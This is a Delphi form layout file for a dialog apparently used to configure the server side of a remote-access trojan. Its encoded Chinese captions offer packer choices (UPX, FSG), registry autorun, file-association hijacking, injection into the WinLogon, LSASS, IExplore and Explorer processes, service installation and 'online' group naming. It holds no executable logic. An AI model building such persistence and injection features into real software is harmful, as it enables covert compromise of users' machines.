object FConfigSvr: TFConfigSvr
  Left = 279
  Top = 248
  BorderStyle = bsDialog
  Caption = #26381#21153#22120#31471#37197#32622
  ClientHeight = 286
  ClientWidth = 375
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'MS Sans Serif'
  Font.Style = []
  OldCreateOrder = False
  Position = poScreenCenter
  PixelsPerInch = 96
  TextHeight = 13
  object PageControl1: TPageControl
    Left = 0
    Top = 0
    Width = 375
    Height = 217
    ActivePage = TabSheet2
    Align = alTop
    TabIndex = 1
    TabOrder = 0
    object TabSheet1: TTabSheet
      Caption = #23433#35013#36873#39033
      object CheckBox1: TCheckBox
        Left = 11
        Top = 167
        Width = 97
        Height = 17
        Caption = #23433#35013#20026#26381#21153
        Checked = True
        State = cbChecked
        TabOrder = 0
      end
      object GroupBox2: TGroupBox
        Left = 8
        Top = 11
        Width = 257
        Height = 105
        Caption = #25991#20214#31867#22411
        TabOrder = 1
        object Label2: TLabel
          Left = 11
          Top = 64
          Width = 48
          Height = 13
          Caption = #25991#20214#21517#65306
        end
        object RadioButton4: TRadioButton
          Left = 9
          Top = 25
          Width = 66
          Height = 17
          Caption = 'EXE'#25991#20214
          TabOrder = 0
        end
        object RadioButton3: TRadioButton
          Left = 86
          Top = 25
          Width = 72
          Height = 17
          Caption = 'DLL'#25991#20214
          Checked = True
          TabOrder = 1
          TabStop = True
        end
        object Edit2: TEdit
          Left = 59
          Top = 61
          Width = 88
          Height = 21
          TabOrder = 2
          Text = 'Edit2'
        end
      end
      object RadioButton1: TRadioButton
        Left = 8
        Top = 136
        Width = 65
        Height = 17
        Caption = #19981#21152#22771
        TabOrder = 2
      end
      object RadioButton2: TRadioButton
        Left = 83
        Top = 137
        Width = 65
        Height = 17
        Caption = 'UPX'#21152#22771
        TabOrder = 3
      end
      object RadioButton5: TRadioButton
        Left = 166
        Top = 137
        Width = 65
        Height = 17
        Caption = 'FSG'#21152#22771
        TabOrder = 4
      end
    end
    object TabSheet2: TTabSheet
      Caption = #21551#21160#36873#39033
      ImageIndex = 1
      object CheckBox3: TCheckBox
        Left = 16
        Top = 14
        Width = 121
        Height = 17
        Caption = #20889#27880#20876#34920#21551#21160#39033
        TabOrder = 0
      end
      object CheckBox4: TCheckBox
        Left = 16
        Top = 104
        Width = 121
        Height = 17
        Caption = #20889#27880#20876#34920#21551#21160#39033
        TabOrder = 1
      end
      object CheckBox5: TCheckBox
        Left = 16
        Top = 46
        Width = 121
        Height = 17
        Caption = #20851#32852'EXE'#25991#20214
        TabOrder = 2
      end
      object CheckBox6: TCheckBox
        Left = 168
        Top = 14
        Width = 121
        Height = 17
        Caption = #25554#20837'WinLogon'#36827#31243
        TabOrder = 3
      end
      object CheckBox7: TCheckBox
        Left = 16
        Top = 75
        Width = 121
        Height = 17
        Caption = #20851#32852'TXT'#25991#20214
        TabOrder = 4
      end
      object CheckBox8: TCheckBox
        Left = 168
        Top = 45
        Width = 121
        Height = 17
        Caption = #25554#20837'IExplore'#36827#31243
        TabOrder = 5
      end
      object CheckBox9: TCheckBox
        Left = 168
        Top = 74
        Width = 121
        Height = 17
        Caption = #25554#20837'LSASS'#36827#31243
        TabOrder = 6
      end
      object CheckBox10: TCheckBox
        Left = 168
        Top = 103
        Width = 121
        Height = 17
        Caption = #25554#20837'Explorer'#36827#31243
        TabOrder = 7
      end
    end
    object TabSheet3: TTabSheet
      Caption = #19978#32447#36873#39033
      ImageIndex = 2
      object Label5: TLabel
        Left = 24
        Top = 24
        Width = 60
        Height = 13
        Caption = #19978#32447#21517#31216#65306
      end
      object Label6: TLabel
        Left = 24
        Top = 59
        Width = 60
        Height = 13
        Caption = #19978#32447#20998#32452#65306
      end
      object Edit5: TEdit
        Left = 86
        Top = 20
        Width = 121
        Height = 21
        TabOrder = 0
        Text = 'Edit5'
      end
      object Edit6: TEdit
        Left = 86
        Top = 55
        Width = 121
        Height = 21
        TabOrder = 1
        Text = 'Edit6'
      end
    end
    object TabSheet4: TTabSheet
      Caption = #20195#29702#36873#39033
      ImageIndex = 3
    end
    object TabSheet5: TTabSheet
      Caption = #26381#21153#36873#39033
      ImageIndex = 4
      object Label1: TLabel
        Left = 15
        Top = 51
        Width = 48
        Height = 13
        Caption = #26381#21153#21517#65306
      end
      object Label4: TLabel
        Left = 15
        Top = 82
        Width = 60
        Height = 13
        Caption = #26174#31034#21517#31216#65306
      end
      object Label3: TLabel
        Left = 16
        Top = 113
        Width = 60
        Height = 13
        Caption = #26381#21153#25551#36848#65306
      end
      object CheckBox2: TCheckBox
        Left = 76
        Top = 22
        Width = 113
        Height = 17
        Caption = #23433#35013#20026#20849#20139#26381#21153
        Checked = True
        State = cbChecked
        TabOrder = 0
      end
      object Edit1: TEdit
        Left = 75
        Top = 48
        Width = 216
        Height = 21
        TabOrder = 1
        Text = 'Edit1'
      end
      object Edit4: TEdit
        Left = 75
        Top = 79
        Width = 216
        Height = 21
        TabOrder = 2
        Text = 'Edit1'
      end
      object Edit3: TEdit
        Left = 75
        Top = 109
        Width = 216
        Height = 21
        TabOrder = 3
        Text = 'Edit1'
      end
    end
  end
  object StatusBar1: TStatusBar
    Left = 0
    Top = 267
    Width = 375
    Height = 19
    Panels = <>
    SimplePanel = False
  end
  object btnOK: TBitBtn
    Left = 80
    Top = 232
    Width = 75
    Height = 25
    Caption = #30830#23450
    TabOrder = 2
    Kind = bkOK
  end
  object btnCancel: TBitBtn
    Left = 191
    Top = 232
    Width = 75
    Height = 25
    Caption = #21462#28040
    TabOrder = 3
    Kind = bkCancel
  end
end
